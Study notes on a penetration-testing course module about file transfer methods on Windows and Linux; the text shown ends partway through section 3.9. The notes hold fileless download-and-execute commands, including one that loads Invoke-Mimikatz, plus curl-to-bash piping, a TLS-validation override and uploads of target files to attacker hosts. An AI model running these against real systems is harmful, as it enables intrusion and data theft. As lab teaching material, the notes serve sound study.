# File Transfers — HTB Academy Notes

---

## Table of Contents

- [1. File Transfers — Introduction](#s1)
  - [1.1 Setting the Stage](#s1-1)
- [2. Windows File Transfer Methods](#s2)
  - [2.1 Introduction — The Astaroth Attack](#s2-1)
  - [2.2 Download Operations](#s2-2)
  - [2.3 PowerShell Base64 Encode & Decode (Download)](#s2-3)
  - [2.4 PowerShell Web Downloads](#s2-4)
  - [2.5 PowerShell DownloadFile Method](#s2-5)
  - [2.6 PowerShell DownloadString — Fileless Method](#s2-6)
  - [2.7 PowerShell Invoke-WebRequest](#s2-7)
  - [2.8 Common Errors with PowerShell](#s2-8)
  - [2.9 SMB Downloads](#s2-9)
  - [2.10 FTP Downloads](#s2-10)
  - [2.11 Upload Operations](#s2-11)
  - [2.12 PowerShell Base64 Encode & Decode (Upload)](#s2-12)
  - [2.13 PowerShell Web Uploads](#s2-13)
  - [2.14 PowerShell Base64 Web Upload](#s2-14)
  - [2.15 SMB Uploads](#s2-15)
  - [2.16 FTP Uploads](#s2-16)
  - [2.17 Recap](#s2-17)
- [3. Linux File Transfer Methods](#s3)
  - [3.1 Introduction — SQL Injection Malware Story](#s3-1)
  - [3.2 Download Operations](#s3-2)
  - [3.3 Base64 Encoding / Decoding](#s3-3)
  - [3.4 Web Downloads with Wget and cURL](#s3-4)
  - [3.5 Fileless Attacks Using Linux](#s3-5)
  - [3.6 Download with Bash (/dev/tcp)](#s3-6)
  - [3.7 SSH Downloads](#s3-7)
  - [3.8 Upload Operations](#s3-8)
  - [3.9 Web Upload](#s3-9)
  - [3.10 Alternative Web File Transfer Method](#s3-10)
  - [3.11 SCP Upload](#s3-11)
  - [3.12 Onwards](#s3-12)
- [4. Transferring Files with Code](#s4)
  - [4.1 Introduction](#s4-1)
  - [4.2 Python](#s4-2)
  - [4.3 PHP](#s4-3)
  - [4.4 Other Languages (Ruby & Perl)](#s4-4)
  - [4.5 JavaScript](#s4-5)
  - [4.6 VBScript](#s4-6)
  - [4.7 Upload Operations using Python3](#s4-7)
  - [4.8 Section Recap](#s4-8)
- [5. Miscellaneous File Transfer Methods](#s5)
  - [5.1 Netcat](#s5-1)
  - [5.2 File Transfer with Netcat and Ncat](#s5-2)
  - [5.3 PowerShell Session File Transfer](#s5-3)
  - [5.4 RDP](#s5-4)
  - [5.5 Practice Makes Perfect](#s5-5)
- [6. Protected File Transfers](#s6)
  - [6.1 Why Encrypt File Transfers](#s6-1)
  - [6.2 File Encryption on Windows](#s6-2)
  - [6.3 File Encryption on Linux](#s6-3)
- [7. Catching Files over HTTP/S](#s7)
  - [7.1 HTTP/S](#s7-1)
  - [7.2 Nginx — Enabling PUT](#s7-2)
  - [7.3 Using Built-in Tools](#s7-3)
- [8. Living off The Land](#s8)
  - [8.1 What are LOLBins?](#s8-1)
  - [8.2 Using the LOLBAS and GTFOBins Projects](#s8-2)
  - [8.3 LOLBAS — CertReq.exe Example](#s8-3)
  - [8.4 GTFOBins — OpenSSL Example](#s8-4)
  - [8.5 Other Common Living off the Land Tools](#s8-5)
  - [8.6 Extra Practice](#s8-6)
- [9. Detection](#s9)
  - [9.1 Command-Line and User-Agent Detection](#s9-1)
  - [9.2 User Agent Signatures by Technique](#s9-2)
- [10. Evading Detection](#s10)
  - [10.1 Changing User Agent](#s10-1)
  - [10.2 LOLBAS / GTFOBins for Evasion](#s10-2)
  - [10.3 Closing Thoughts](#s10-3)

---

<a id="s1"></a>
## 1. File Transfers — Introduction

<a id="s1-1"></a>
### 1.1 Setting the Stage
This introductory section frames the entire module around a realistic engagement scenario, showing why a pentester needs to know *many* file transfer techniques rather than just one. In the scenario, RCE is gained on an IIS server via an unrestricted file upload, but the first-choice tool (PowerShell, to transfer `PowerUp.ps1`) is blocked by Application Control Policy. After manual enumeration reveals `SeImpersonatePrivilege`, the attacker needs to transfer a compiled `PrintSpoofer` binary to escalate privileges — but `Certutil` downloads from GitHub are blocked by web content filtering, FTP is blocked by the firewall (port 21), and only SMB (port 445) outbound traffic turns out to be allowed, which is finally used via Impacket's `smbserver` to deliver the binary and complete the privilege escalation. The core lesson is that file transfer is a core OS feature with many available tools, but defenders (AV/EDR, application whitelisting, firewalls, IDS/IPS) can block many of them — so knowing a wide range of fallback techniques, across both Windows and Linux, is essential for getting a file in or out under real-world restrictions. The module uses this scenario to justify why it covers so many different native tools, scripting languages, and protocols rather than just one "best" method.

---

<a id="s2"></a>
## 2. Windows File Transfer Methods

<a id="s2-1"></a>
### 2.1 Introduction — The Astaroth Attack
This section opens by explaining that different Windows versions ship with different built-in utilities for file transfer, and understanding them benefits both attackers and defenders. It then walks through the real-world Astaroth APT campaign (from a Microsoft blog post) as a case study in chained, "fileless" file transfer abuse. "Fileless" doesn't mean no file transfer occurs — it means the final payload isn't saved to disk as a standalone file but instead runs in memory, using legitimate built-in tools at each step. The Astaroth chain worked as follows: a spear-phishing email led to a malicious LNK file; double-clicking it triggered WMIC with the `/Format` parameter, which downloaded and ran malicious JavaScript; that JavaScript used Bitsadmin to download further payloads; those payloads were Base64-encoded and were decoded using Certutil into DLL files; finally, `regsvr32` loaded one of those DLLs, which decrypted and chained-loaded further files until the final Astaroth payload was injected into the `Userinit` process. This example sets up the rest of the section, which covers native Windows tools (PowerShell, SMB, FTP) for both download and upload operations — the same categories of tool abused in the Astaroth chain.

<a id="s2-2"></a>
### 2.2 Download Operations
This is a short framing header introducing the practical download scenario used throughout the section: having access to a machine called MS02 and needing to pull a file down from the Pwnbox attack host. It sets up the sequence of download techniques that follow — base64 copy-paste, PowerShell web downloads, SMB, and FTP — each demonstrated against this same scenario so the techniques can be directly compared.

<a id="s2-3"></a>
### 2.3 PowerShell Base64 Encode & Decode (Download)
This technique avoids direct network communication between hosts by encoding a file into a Base64 text string on one machine, copy-pasting that string across (e.g., through an existing shell or RDP clipboard), and decoding it back into a file on the target. It's especially useful when no direct file-transfer channel exists but you do have command execution. A critical step is verifying file integrity with an MD5 checksum (via `md5sum` on Linux or `Get-FileHash` on Windows) before and after the transfer, since copy-paste can introduce corruption. The method has practical limits — `cmd.exe` caps string length at 8,191 characters, and web shells may fail on very large strings — so it's best suited to small files like SSH keys or scripts.

**Step 1 — Check the file's MD5 hash on Pwnbox (before transfer):**
```shellsession
SyedZainImam@htb[/htb]$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```
`md5sum` computes a 128-bit MD5 checksum of the file — a unique fingerprint used later to confirm the transferred copy is identical.

**Step 2 — Encode the file to Base64 on Pwnbox:**
```shellsession
SyedZainImam@htb[/htb]$ cat id_rsa |base64 -w 0;echo
LS0tLS1CRUdJTi...(truncated)...LQo=
```
`cat id_rsa` prints the file's raw contents, piped into `base64`, which encodes binary/text data into a safe-to-copy text string; `-w 0` disables line-wrapping so the output stays on a single line (easier to copy); `echo` afterward just adds a newline so the shell prompt doesn't run into the output.

**Step 3 — Decode the Base64 string on the Windows target:**
```PowerShell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTi...LQo="))
```
`[Convert]::FromBase64String(...)` decodes the pasted Base64 string back into raw bytes; `[IO.File]::WriteAllBytes(path, bytes)` writes those bytes directly to the specified file path on disk, recreating the original file.

**Step 4 — Confirm the hashes match on Windows:**
```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```
`Get-FileHash` is PowerShell's equivalent of `md5sum`; the `-Algorithm md5` flag specifies MD5, and the resulting hash is compared (case-insensitively) against the original from Step 1 to confirm a perfect, uncorrupted transfer.

<a id="s2-4"></a>
### 2.4 PowerShell Web Downloads
Since most organizations allow outbound HTTP/HTTPS traffic for normal business use, abusing these protocols for file transfer is highly convenient — though defenders can still apply web filtering, block specific file extensions (like `.exe`), or restrict traffic to a domain whitelist. PowerShell's `System.Net.WebClient` class is the core tool for this, supporting HTTP, HTTPS, and FTP downloads. The table below (from the module) lists its key methods:

| Method | Description |
|---|---|
| OpenRead | Returns the data from a resource as a Stream |
| OpenReadAsync | Returns the data without blocking the calling thread |
| DownloadData | Downloads data and returns a Byte array |
| DownloadDataAsync | Downloads data as a Byte array without blocking |
| DownloadFile | Downloads data from a resource to a local file |
| DownloadFileAsync | Downloads to a local file without blocking |
| DownloadString | Downloads a String from a resource and returns it |
| DownloadStringAsync | Downloads a String without blocking |

<a id="s2-5"></a>
### 2.5 PowerShell DownloadFile Method
This shows the most direct way to pull a file over HTTP/HTTPS using `Net.WebClient`, saving it straight to disk — useful when you just need the file present on the target for later execution.

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
**Step-by-step:**
1. `New-Object Net.WebClient` instantiates a new WebClient object, the class responsible for handling the HTTP(S)/FTP transfer.
2. `.DownloadFile('<URL>', '<OutputPath>')` downloads the content at the given URL and writes it directly to the specified local path, blocking execution until finished.
3. `.DownloadFileAsync(...)` does the same thing but asynchronously, letting the script continue running while the download happens in the background.

<a id="s2-6"></a>
### 2.6 PowerShell DownloadString — Fileless Method
This demonstrates a genuinely fileless technique: instead of saving a script to disk, the script's text content is downloaded directly into memory and executed immediately via `Invoke-Expression` (aliased `IEX`), leaving no file artifact on disk for defenders to find.

```PowerShell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
**Step-by-step:**
1. `(New-Object Net.WebClient).DownloadString('<URL>')` fetches the content at the URL and returns it as a string (rather than saving it as a file).
2. `IEX (...)` wraps that call, taking the returned string and executing it immediately as PowerShell code in the current session's memory.

The module also notes `IEX` accepts pipeline input, so the same result can be written as:
```PowerShell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
Here the downloaded string is piped directly into `IEX`, achieving the same fileless execution with slightly different syntax.

<a id="s2-7"></a>
### 2.7 PowerShell Invoke-WebRequest
Available from PowerShell 3.0 onward, `Invoke-WebRequest` is a more modern cmdlet for web requests (aliased `iwr`, `curl`, `wget` — note these aliases shadow the real Linux tools when used inside PowerShell), though the module notes it's noticeably slower than `WebClient` for downloads.

```PowerShell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
`Invoke-WebRequest <URL> -OutFile <path>` sends an HTTP GET request to the URL and saves the response body to the specified local file. The module also references Harmj0y's compiled list of PowerShell "download cradles" as worth studying, since different cradles vary in proxy-awareness and whether they touch disk.

<a id="s2-8"></a>
### 2.8 Common Errors with PowerShell
This covers two common failure modes when using PowerShell web cmdlets, and how to work around each.

**Error 1 — Internet Explorer first-launch configuration not complete:** `Invoke-WebRequest` can fail if IE's initial setup hasn't been completed on the host, since it relies on the IE engine for parsing by default.
```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
```
This throws: `Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available...`
**Fix:** add the `-UseBasicParsing` flag, which bypasses the IE engine dependency entirely:
```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

**Error 2 — Untrusted SSL/TLS certificate:** downloads over HTTPS can fail if the target's certificate isn't trusted by the Windows host (common with self-signed certs used by attacker infrastructure).
```PowerShell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
This throws: `Exception calling "DownloadString"... Could not establish trust relationship for the SSL/TLS secure channel.`
**Fix:** override the certificate validation callback so PowerShell accepts any certificate (effectively disabling cert validation for the session):
```PowerShell-session
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

<a id="s2-9"></a>
### 2.9 SMB Downloads
SMB (port TCP/445) is common in enterprise Windows networks and lets applications/users transfer files to and from remote servers. On the attack side, Impacket's `smbserver.py` can spin up an ad-hoc SMB share on Pwnbox, which the Windows target can then connect to using `copy`, `move`, PowerShell's `Copy-Item`, or any SMB-capable tool. A key complication covered is that newer Windows versions block unauthenticated guest access by default, requiring the SMB server to be set up with explicit credentials.

**Step 1 — Create an (anonymous) SMB server on Pwnbox:**
```shellsession
SyedZainImam@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```
This starts an SMB server named `share`, backed by the local folder `/tmp/smbshare`, with `-smb2support` enabling SMBv2 protocol support for broader compatibility.

**Step 2 — Attempt to copy a file from the share (cmd):**
```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe
```
`copy` is the native Windows command to copy files; here the source is a UNC path pointing at the SMB share, and no destination is given, so it copies to the current directory.

**Step 3 — Handle the guest-access block:** newer Windows versions reject this with a security-policy error blocking unauthenticated guest access. The fix is to run the SMB server with a username/password and mount the share using those credentials.

**Step 4 — Create an authenticated SMB server:**
```shellsession
SyedZainImam@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
Adding `-user test -password test` requires any client to authenticate with those exact credentials before accessing the share.

**Step 5 — Mount the share with credentials and copy the file:**
```cmd
C:\htb> net use n: \\192.168.220.133\share /user:test test
C:\htb> copy n:\nc.exe
```
`net use n: \\IP\share /user:test test` maps the remote share to local drive letter `n:`, authenticating with the username and password provided; `copy n:\nc.exe` then copies the file from that now-mounted drive like any local path.

<a id="s2-10"></a>
### 2.10 FTP Downloads
FTP (ports TCP/21 control, TCP/20 data) is another classic transfer protocol, usable via the native Windows FTP client or PowerShell's `Net.WebClient`. The module sets up an attacker-side FTP server using Python's `pyftpdlib` module, with anonymous authentication enabled by default when no user/password is configured.

**Step 1 — Install the FTP server module:**
```shellsession
SyedZainImam@htb[/htb]$ sudo pip3 install pyftpdlib
```

**Step 2 — Start the FTP server on the standard port:**
```shellsession
SyedZainImam@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
```
By default `pyftpdlib` listens on port 2121, so `--port 21` overrides it to use the standard FTP port.

**Step 3 — Download via PowerShell Net.WebClient:**
```PowerShell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
This works exactly like the earlier HTTP `DownloadFile` example, except the URL scheme is `ftp://` instead of `http://`.

**Step 4 — Download via a non-interactive FTP command file (when no interactive shell is available):**
```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
```
**Step-by-step:**
1. Each `echo ... > ftpcommand.txt` / `echo ... >> ftpcommand.txt` line appends one FTP command to a script file (`>` creates/overwrites the file on the first line, `>>` appends on the rest).
2. The commands written are: connect to the server (`open`), log in as `anonymous`, switch to binary transfer mode, download the target file (`GET`), then close the session (`bye`).
3. `ftp -v -n -s:ftpcommand.txt` launches the FTP client in verbose mode (`-v`), disables auto-login (`-n`), and feeds it the command script (`-s:`) to execute non-interactively — useful for non-interactive shells like web shells where you can't respond to FTP prompts manually.

<a id="s2-11"></a>
### 2.11 Upload Operations
This is a short framing header introducing the reverse scenario: situations like password cracking, analysis, or exfiltration require pulling files *off* the compromised target and onto the attack host. The module notes the same underlying methods (base64, PowerShell web, SMB, FTP) apply here too, just reversed.

<a id="s2-12"></a>
### 2.12 PowerShell Base64 Encode & Decode (Upload)
This is the reverse of the earlier download technique: encode a file to Base64 on the Windows target, copy the string across, and decode it back into a file on the attack host.

**Step 1 — Encode the file on Windows:**
```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
`Get-Content -path <file> -Encoding byte` reads the file as raw bytes; `[Convert]::ToBase64String(...)` encodes those bytes into a Base64 text string, ready to copy out.

**Step 2 — Hash the file for later verification:**
```powershell
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
Computes the MD5 hash of the original file so the copy on Linux can be checked against it.

**Step 3 — Decode on the Linux attack host:**
```shellsession
SyedZainImam@htb[/htb]$ echo <base64-string> | base64 -d > hosts
```
`echo <string>` prints the pasted Base64 text, piped into `base64 -d` which decodes it back into raw bytes, redirected (`>`) into a new file named `hosts`.

**Step 4 — Confirm the hash matches:**
```shellsession
SyedZainImam@htb[/htb]$ md5sum hosts
```
Compares this computed hash against the one from Step 2 to confirm the file transferred intact.

<a id="s2-13"></a>
### 2.13 PowerShell Web Uploads
PowerShell has no built-in upload function, so `Invoke-WebRequest` or `Invoke-RestMethod` must be used to build one manually, and a receiving web server that actually accepts uploads is needed (most default web server tools don't support this out of the box). The module uses `uploadserver`, a Python module that extends `http.server` with a file-upload page.

**Step 1 — Install and start the upload server on Pwnbox:**
```shellsession
SyedZainImam@htb[/htb]$ pip3 install uploadserver
SyedZainImam@htb[/htb]$ python3 -m uploadserver
```
This installs the module, then starts a web server with an upload endpoint available at `/upload`, listening on port 8000 by default.

**Step 2 — Upload from Windows using a pre-built PSUpload script:**
```PowerShell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
**Step-by-step:**
1. The first line fileless-loads the `PSUpload.ps1` script into memory (same `IEX` + `DownloadString` pattern covered earlier), which defines a custom `Invoke-FileUpload` function using `Invoke-RestMethod` under the hood.
2. `Invoke-FileUpload -Uri <upload-endpoint> -File <path>` calls that function, specifying the server's upload URL and the local file to send.
3. The script confirms success and prints the uploaded file's hash for verification.

<a id="s2-14"></a>
### 2.14 PowerShell Base64 Web Upload
An alternative upload method combines Base64 encoding with a raw POST request caught by Netcat, instead of a dedicated upload server — useful when you don't want to stand up `uploadserver` specifically.

**Step 1 — Encode and POST the file from Windows:**
```PowerShell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
**Step-by-step:**
1. The first line reads the target file as bytes and Base64-encodes it into the `$b64` variable, same as before.
2. `Invoke-WebRequest -Uri <url> -Method POST -Body $b64` sends that encoded string as the body of an HTTP POST request to the specified address.

**Step 2 — Catch the POST request with Netcat on the attack host:**
```shellsession
SyedZainImam@htb[/htb]$ nc -lvnp 8000
```
`nc -lvnp 8000` listens (`-l`) verbosely (`-v`) without DNS resolution (`-n`) on port 8000 (`-p 8000`); the raw HTTP POST request, including the Base64 body, appears in the terminal output.

**Step 3 — Decode the captured Base64 data into a file:**
```shellsession
SyedZainImam@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```
The Base64 text copied out of the Netcat output is piped into `base64 -d` to decode it back into the original file content, saved as `hosts`.

<a id="s2-15"></a>
### 2.15 SMB Uploads
Many organizations block outbound SMB (TCP/445) to prevent lateral movement/exfiltration risk, since HTTP/HTTPS are typically allowed instead. A workaround is running SMB over HTTP via WebDAV (RFC 4918), an HTTP extension that lets a web server behave like a file server. When a Windows client tries to connect via SMB and no SMB share exists, it automatically falls back to trying HTTP — confirmed in the module's Wireshark capture showing exactly this fallback sequence.

**Step 1 — Install the WebDAV Python modules on Pwnbox:**
```shellsession
SyedZainImam@htb[/htb]$ sudo pip3 install wsgidav cheroot
```
`wsgidav` is the WebDAV server implementation, and `cheroot` is the underlying WSGI HTTP server it runs on.

**Step 2 — Start the WebDAV server:**
```shellsession
SyedZainImam@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
This serves the `/tmp` directory as a WebDAV share, listening on all interfaces (`0.0.0.0`) on port 80, with anonymous authentication enabled (no credentials required).

**Step 3 — Connect from Windows using the DavWWWRoot keyword:**
```cmd
C:\htb> dir \\192.168.49.128\DavWWWRoot
```
`DavWWWRoot` is a special keyword recognized by the Windows shell's Mini-Redirector driver, telling it to connect to the root of a WebDAV server at that address rather than looking for a literal folder named that. The module notes you can skip this keyword entirely by connecting to a folder that actually exists on the server (e.g., `\\IP\sharefolder`).

**Step 4 — Upload a file using the standard copy command over this WebDAV connection:**
```cmd
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
Both commands behave identically to a normal SMB `copy`, except the connection is transparently carried over HTTP via WebDAV instead of native SMB.

<a id="s2-16"></a>
### 2.16 FTP Uploads
Uploading via FTP mirrors downloading, but the attacker's `pyftpdlib` server must be explicitly configured to accept writes, since it denies uploads by default for safety.

**Step 1 — Start the FTP server with write permission enabled:**
```shellsession
SyedZainImam@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```
The `--write` flag grants anonymous clients permission to upload files to the server (the module notes this produces a runtime warning since write access for anonymous users is inherently risky).

**Step 2 — Upload via PowerShell:**
```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
`.UploadFile('<destination-url>', '<local-path>')` is the upload counterpart to the earlier `DownloadFile` method, sending the local file to the specified FTP destination.

**Step 3 — Upload via a non-interactive FTP command file:**
```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
```
This follows the exact same pattern as the earlier FTP download command file, except it uses `PUT` instead of `GET` to upload the file rather than retrieve one.

<a id="s2-17"></a>
### 2.17 Recap
This closing note summarizes that the section covered several native-tool methods for downloading and uploading files on Windows — PowerShell (base64, WebClient, Invoke-WebRequest), SMB, and FTP — but that there's more ground to cover, which the module addresses in later sections on Living Off The Land binaries across both Windows and Linux.

---

<a id="s3"></a>
## 3. Linux File Transfer Methods

<a id="s3-1"></a>
### 3.1 Introduction — SQL Injection Malware Story
This section opens with a real incident-response case: investigating nine compromised web servers, six of which had been breached via a SQL injection vulnerability that was used to run a Bash script. That script tried three download methods in sequence to fetch a second-stage malware payload connecting to the attacker's C2 server — first cURL, then wget if that failed, then Python as a last resort — all three using HTTP for communication. The module notes that while Linux also supports FTP and SMB like Windows, most malware across all operating systems favors HTTP/HTTPS, likely because it's the protocol most reliably allowed outbound through firewalls. This sets up the rest of the section, which works through HTTP-based tools, Bash built-ins, and SSH as the primary Linux file transfer categories.

<a id="s3-2"></a>
### 3.2 Download Operations
A short framing header: the scenario is having access to a machine called NIX04 and needing to download a file from the Pwnbox attack host, mirroring the Windows section's structure but using Linux-native tools.

<a id="s3-3"></a>
### 3.3 Base64 Encoding / Decoding
Identical in concept to the Windows version — encode a file to Base64 text to transfer it via copy-paste without needing network connectivity, then decode and verify it on the other end using MD5 hashes.

**Step 1 — Check the file's MD5 hash before transfer:**
```shellsession
SyedZainImam@htb[/htb]$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Step 2 — Encode the file to Base64:**
```shellsession
SyedZainImam@htb[/htb]$ cat id_rsa |base64 -w 0;echo
```
`cat id_rsa` prints the file; piping to `base64 -w 0` encodes it as one unbroken line (easier to copy); `echo` adds a trailing newline for readability.

**Step 3 — Decode the string on the Linux target:**
```shellsession
SyedZainImam@htb[/htb]$ echo -n 'LS0tLS1CRUdJTi...LQo=' | base64 -d > id_rsa
```
`echo -n` prints the pasted string without adding an extra newline (important so the decoded output isn't corrupted by a stray character); piping into `base64 -d` decodes it back to the original binary/text content, redirected into a new file.

**Step 4 — Confirm the hashes match:**
```shellsession
SyedZainImam@htb[/htb]$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```
The module also notes this process works in reverse for uploads: `cat` and `base64`-encode a file on the compromised target, then decode it on Pwnbox.

<a id="s3-4"></a>
### 3.4 Web Downloads with Wget and cURL
`wget` and `curl` are the two most common command-line HTTP(S) clients on Linux, both widely pre-installed across distributions.

**Download with wget (output flag is uppercase `-O`):**
```shellsession
SyedZainImam@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
`wget <URL> -O <path>` downloads the resource at the URL and saves it to the specified output path.

**Download with cURL (output flag is lowercase `-o`):**
```shellsession
SyedZainImam@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
Functionally identical to the wget example, just with cURL's syntax — note the case difference in the output flag between the two tools, a common source of mistakes.

<a id="s3-5"></a>
### 3.5 Fileless Attacks Using Linux
Because Linux pipes let output from one command feed directly into another, most download tools can be chained straight into an interpreter, executing a payload in memory without ever saving it to disk as a standalone file. The module notes a caveat: some payloads (e.g., those using `mkfifo`) still write temporary files to disk even when "fileless" from an execution standpoint, so the term describes avoiding a persistent final payload file, not necessarily zero disk activity.

**Fileless execution with cURL, piped into Bash:**
```shellsession
SyedZainImam@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
`curl <URL>` streams the script's content to stdout instead of saving it; the pipe (`|`) feeds that content directly into `bash`, which executes it immediately — the script is never written to disk.

**Fileless execution with wget, piped into Python3:**
```shellsession
SyedZainImam@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
Hello World!
```
`-q` suppresses wget's normal status output; `-O-` tells wget to write the downloaded content to standard output instead of a file; piping that into `python3` executes the downloaded script directly in memory.

<a id="s3-6"></a>
### 3.6 Download with Bash (/dev/tcp)
When no file transfer tools (wget, curl, Python) are available at all, Bash itself (version 2.04+, compiled with `--enable-net-redirections`) can perform a raw TCP download using its built-in `/dev/tcp` pseudo-device, making it a last-resort fallback that relies on nothing but the shell itself.

**Step 1 — Open a TCP connection to the target web server:**
```shellsession
SyedZainImam@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```
`exec 3<>...` opens file descriptor 3 as a bidirectional connection to `/dev/tcp/<host>/<port>` — Bash's special syntax that opens a raw TCP socket to the specified host and port (here, port 80, HTTP).

**Step 2 — Manually send an HTTP GET request over that connection:**
```shellsession
SyedZainImam@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
`echo -e` interprets the `\n` escape sequences to build a (minimal, technically incomplete but often functional) raw HTTP GET request; `>&3` redirects that output into file descriptor 3, sending it over the open TCP connection to the server.

**Step 3 — Read the server's response:**
```shellsession
SyedZainImam@htb[/htb]$ cat <&3
```
`cat <&3` reads from file descriptor 3 (the open connection) and prints the server's raw HTTP response, including the requested file's content, to the terminal.

<a id="s3-7"></a>
### 3.7 SSH Downloads
SSH provides a secure channel for remote access, and its SCP (Secure Copy) utility, included with most SSH implementations, allows secure file transfer between two hosts over that same protocol. SCP's syntax resembles `cp`/`copy` but requires specifying a username, remote host, and credentials since it operates across the network rather than locally.

**Step 1 — Enable the SSH server on Pwnbox (if not already running):**
```shellsession
SyedZainImam@htb[/htb]$ sudo systemctl enable ssh
```
`systemctl enable ssh` configures the SSH service to start automatically (e.g., on boot), registering it with the system's init process.

**Step 2 — Start the SSH server:**
```shellsession
SyedZainImam@htb[/htb]$ sudo systemctl start ssh
```
This actually starts the SSH daemon running immediately (enabling alone only configures auto-start, it doesn't start the service right away).

**Step 3 — Confirm SSH is listening:**
```shellsession
SyedZainImam@htb[/htb]$ netstat -lnpt
```
`netstat -lnpt` lists listening (`-l`) TCP (`-t`) sockets numerically (`-n`, skipping DNS lookups) along with the owning process (`-p`); the output confirms port 22 is open and listening.

**Step 4 — Download a file from the target to Pwnbox using SCP:**
```shellsession
SyedZainImam@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```
`scp <user>@<host>:<remote-path> <local-path>` connects to the specified host as the given user, and copies the remote file down to the current local directory (`.`). The module recommends using a temporary, dedicated account for this kind of transfer rather than primary credentials or keys.

<a id="s3-8"></a>
### 3.8 Upload Operations
A short framing header introducing the upload scenario: situations like binary exploitation or packet capture analysis require pulling files from the target onto the attack host, and the same categories of tool used for downloads apply here too, just reversed.

<a id="s3-9"></a>
### 3.9 Web Upload
This extends the earlier `uploadserver` Python module example, this time configuring it to use HTTPS via a self-signed certificate for secure communication during upload.

**Step 1 — Install the uploadserver module:**
```shellsession
SyedZainImam@htb[/htb]$ sudo python3 -m pip install --user uploadserver
```

**Step 2 — Create a self-signed TLS certificate:**
```shellsession
SyedZainImam@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
